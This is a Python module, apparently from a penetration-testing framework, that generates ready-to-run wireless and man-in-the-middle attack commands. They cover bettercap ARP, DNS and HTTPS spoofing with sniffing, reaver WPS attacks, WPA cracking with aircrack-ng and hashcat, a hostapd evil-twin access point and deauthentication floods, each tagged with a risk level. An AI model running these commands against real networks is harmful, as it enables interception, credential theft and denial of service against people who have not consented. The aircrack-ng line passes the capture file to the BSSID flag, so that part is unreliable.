"""Wireless Attacks Module — bettercap MITM, WiFi scanning, WPA cracking."""

from __future__ import annotations
import subprocess
from dataclasses import dataclass
from typing import Any, Optional


@dataclass
class WirelessNetwork:
    """Detected wireless network."""
    essid: str
    bssid: str
    channel: int
    encryption: str
    signal: int
    cipher: str
    auth: str


@dataclass
class MITMTarget:
    """MITM attack target."""
    ip: str
    mac: str
    hostname: str
    vendor: str


class WirelessAttacks:
    """Wireless and MITM attack toolkit."""

    def __init__(self, config: Optional[dict] = None):
        self.config = config or {}

    def wifite_scan(self, interface: str = "wlan0") -> dict[str, Any]:
        """Scan WiFi networks with wifite."""
        cmd = f"wifite --dict /usr/share/wordlists/rockyou.txt --kill -i {interface}"
        return {
            "command": cmd,
            "description": f"WiFi scan and attack on {interface}",
            "risk_level": "dangerous",
            "docker_required": True,
        }

    def bettercap_start(self, interface: str = "eth0") -> dict[str, Any]:
        """Start bettercap interactive session."""
        cmd = f"bettercap -iface {interface}"
        return {
            "command": cmd,
            "description": f"Start bettercap on {interface}",
            "risk_level": "active",
            "docker_required": True,
        }

    def bettercap_arp_spoof(
        self,
        interface: str,
        target: str,
        gateway: str,
    ) -> dict[str, Any]:
        """ARP spoofing attack via bettercap."""
        cmd = (
            f"bettercap -iface {interface} -eval '"
            f"set arp.spoof.targets {target}; "
            f"set arp.spoof.fullduplex true; "
            f"arp.spoof on; "
            f"net.sniff on'"
        )
        return {
            "command": cmd,
            "description": f"ARP spoof {target} via {gateway} on {interface}",
            "risk_level": "dangerous",
            "docker_required": True,
            "port": 0,
        }

    def bettercap_dns_spoof(
        self,
        interface: str,
        spoof_domain: str,
        spoof_ip: str,
    ) -> dict[str, Any]:
        """DNS spoofing attack."""
        cmd = (
            f"bettercap -iface {interface} -eval '"
            f"set dns.spoof.domains {spoof_domain}; "
            f"set dns.spoof.address {spoof_ip}; "
            f"dns.spoof on; "
            f"net.sniff on'"
        )
        return {
            "command": cmd,
            "description": f"DNS spoof {spoof_domain} -> {spoof_ip}",
            "risk_level": "dangerous",
            "docker_required": True,
        }

    def bettercap_https_spoof(
        self,
        interface: str,
        target_domain: str,
        cert_path: str,
        key_path: str,
    ) -> dict[str, Any]:
        """HTTPS spoofing with custom certificate."""
        cmd = (
            f"bettercap -iface {interface} -eval '"
            f"set https.spoof.domains {target_domain}; "
            f"set https.spoof.pemPath {cert_path}; "
            f"set https.spoof.keyPath {key_path}; "
            f"https.spoof on; "
            f"net.sniff on'"
        )
        return {
            "command": cmd,
            "description": f"HTTPS spoof for {target_domain}",
            "risk_level": "critical",
            "docker_required": True,
            "confirmation_required": True,
        }

    def bettercap_sniffer(
        self,
        interface: str,
        output_file: str = "/tmp/bettercap_capture.pcap",
    ) -> dict[str, Any]:
        """Network packet sniffing."""
        cmd = (
            f"bettercap -iface {interface} -eval '"
            f"set net.sniff.output {output_file}; "
            f"net.sniff on'"
        )
        return {
            "command": cmd,
            "description": f"Sniff network traffic to {output_file}",
            "risk_level": "active",
            "docker_required": True,
        }

    def bettercap_caplet(
        self,
        interface: str,
        caplet_path: str,
    ) -> dict[str, Any]:
        """Run a bettercap caplet script."""
        cmd = f"bettercap -iface {interface} -caplet {caplet_path}"
        return {
            "command": cmd,
            "description": f"Run caplet {caplet_path} on {interface}",
            "risk_level": "active",
            "docker_required": True,
        }

    def reaver_wps(
        self,
        interface: str,
        bssid: str,
        channel: int,
    ) -> dict[str, Any]:
        """WPS PIN attack with reaver."""
        cmd = (
            f"reaver -i {interface} -b {bssid} "
            f"-c {channel} -vv -N -d 1 -r 3:15"
        )
        return {
            "command": cmd,
            "description": f"WPS PIN attack on {bssid}",
            "risk_level": "dangerous",
            "docker_required": True,
        }

    def aircrack_wpa(
        self,
        capture_file: str,
        wordlist: str = "/usr/share/wordlists/rockyou.txt",
    ) -> dict[str, Any]:
        """Crack WPA handshake with aircrack-ng."""
        cmd = f"aircrack-ng -w {wordlist} -b {capture_file}"
        return {
            "command": cmd,
            "description": f"WPA crack using {wordlist}",
            "risk_level": "active",
            "docker_required": True,
        }

    def hostapd_evil_twin(
        self,
        interface: str,
        essid: str,
        channel: int = 6,
    ) -> dict[str, Any]:
        """Create evil twin access point."""
        config_content = f"""interface={interface}
driver=nl80211
ssid={essid}
channel={channel}
hw_mode=g
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0"""
        cmd = (
            f"echo '{config_content}' > /tmp/hostapd.conf && "
            f"hostapd /tmp/hostapd.conf"
        )
        return {
            "command": cmd,
            "description": f"Evil twin AP: {essid} on channel {channel}",
            "risk_level": "critical",
            "docker_required": True,
            "confirmation_required": True,
        }

    def wifi_deauth(
        self,
        interface: str,
        target_bssid: str,
        count: int = 10,
    ) -> dict[str, Any]:
        """Deauthentication attack."""
        cmd = f"aireplay-ng --deauth {count} -a {target_bssid} {interface}"
        return {
            "command": cmd,
            "description": f"Deauth {target_bssid} ({count} packets)",
            "risk_level": "critical",
            "docker_required": True,
            "confirmation_required": True,
        }

    def hashcat_wpa(
        self,
        hash_file: str,
        wordlist: str = "/usr/share/wordlists/rockyou.txt",
    ) -> dict[str, Any]:
        """Crack WPA2 hash with hashcat."""
        cmd = f"hashcat -m 22000 {hash_file} {wordlist} --force"
        return {
            "command": cmd,
            "description": f"Hashcat WPA2 crack on {hash_file}",
            "risk_level": "active",
            "docker_required": True,
        }

    def list_interfaces(self) -> dict[str, Any]:
        """List available network interfaces."""
        cmd = "iwconfig 2>/dev/null | grep -E '^[a-z]' | awk '{print $1}'"
        return {
            "command": cmd,
            "description": "List wireless interfaces",
            "risk_level": "safe",
        }
